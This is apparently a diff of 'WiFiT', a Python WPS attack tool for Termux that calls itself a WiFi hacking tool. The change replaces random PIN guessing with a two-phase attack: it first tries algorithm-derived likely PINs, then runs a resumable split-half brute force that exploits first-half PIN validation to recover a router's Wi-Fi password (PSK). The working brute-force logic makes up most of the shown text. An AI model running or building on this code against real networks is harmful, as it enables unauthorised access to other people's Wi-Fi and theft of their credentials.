@@ -3,7 +3,7 @@
 """
 WiFiT - Professional WPS Penetration Testing Tool
 Author: TuHiN
-Version: 3.0.0-rc.1
+Version: 3.0.0-rc.3
 
 Designed for Rooted Android Devices with Termux
 A hybrid WiFi hacking tool combining the best features from multiple sources.
@@ -477,7 +477,7 @@ def show_wifit_banner():
     current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     banner = f"""
 \033[1;36m╔══════════════════════════════════════════════════════════════╗
-║                   🛡️  WiFiT v3.0.0-rc.1                     ║
+║                   🛡️  WiFiT v3.0.0-rc.3                     ║
 ║         Professional WPS Testing Toolkit for Termux          ║
 ║                      Author: TuHiN                           ║
 ╠══════════════════════════════════════════════════════════════╣
@@ -788,39 +788,72 @@ class Companion:
         return False
 
     def smart_bruteforce(self, bssid, delay=1.0):
-        """Smart brute force with generated PINs"""
-        print("[*] Starting smart brute force attack...")
-        tried_pins = set()
+        """Smart brute force with RC2 deterministic PIN generation"""
+        print("[*] Starting deterministic brute force attack...")
+        from wifit_core.wps_bruteforce import BruteforceSession
+        from wifit_core.pin_generator import get_likely_pins
+        
         self.bruteforce = BruteforceStatus()
+        tried_pins = set()
         
-        # Try suggested PINs first
-        suggested = self.generator.getSuggestedList(bssid)
-        for pin in suggested:
+        # Try likely algorithm-generated PINs first
+        print("[*] Phase 1: Trying algorithm-generated PINs...")
+        likely_pins = get_likely_pins(bssid)
+        for pin in likely_pins[:10]:  # Try top 10 likely PINs
             if pin in tried_pins:
                 continue
             tried_pins.add(pin)
-            self.bruteforce.registerAttempt(pin)
-            self.single_connection(bssid, pin)
+            self.bruteforce.registerAttempt(pin[:4] if len(pin) >= 4 else pin)
+            print(f"[*] Trying PIN: {pin}")
+            result = self.single_connection(bssid, pin)
             if self.connection_status.status == 'GOT_PSK':
                 return True
             time.sleep(delay)
         
-        # Random PIN generation
-        for _ in range(1000):
-            base_pin = random.randint(0, 9999999)
-            base_pin_str = str(base_pin).zfill(7)
-            checksum = self.generator.checksum(int(base_pin_str))
-            pin = base_pin_str + str(checksum)
-            
-            if pin in tried_pins:
-                continue
-            tried_pins.add(pin)
-            self.bruteforce.registerAttempt(pin)
-            self.single_connection(bssid, pin)
-            if self.connection_status.status == 'GOT_PSK':
-                return True
-            time.sleep(delay)
+        # If likely PINs fail, start systematic brute force
+        print("[*] Phase 2: Starting systematic split-half brute force...")
+        print("[*] This will try first-half validation (10,000 PINs)")
         
+        # Create brute force session for resumability
+        session = BruteforceSession(bssid)
+        progress = session.start()
+        
+        try:
+            for attempt_progress, pin in session.iterate_pins():
+                if pin in tried_pins:
+                    continue
+                tried_pins.add(pin)
+                
+                # Update status display
+                self.bruteforce.registerAttempt(pin[:4])
+                
+                result = self.single_connection(bssid, pin)
+                
+                # Check for success
+                if self.connection_status.status == 'GOT_PSK':
+                    session.delete()  # Clean up session on success
+                    return True
+                
+                # Check if first half was valid
+                first_half_valid = self.connection_status.isFirstHalfValid()
+                
+                # Update session with first-half result
+                if progress.phase == "first_half" and first_half_valid:
+                    session.update(first_half_success=True)
+                else:
+                    session.update(first_half_success=False)
+                
+                progress = session.get_progress()
+                
+                # Respect delay
+                time.sleep(delay)
+                
+        except KeyboardInterrupt:
+            print("\n[!] Brute force interrupted - progress saved")
+            session.save()
+            raise
+        
+        session.delete()  # Clean up if exhausted
         return False
 
     def cleanup(self):
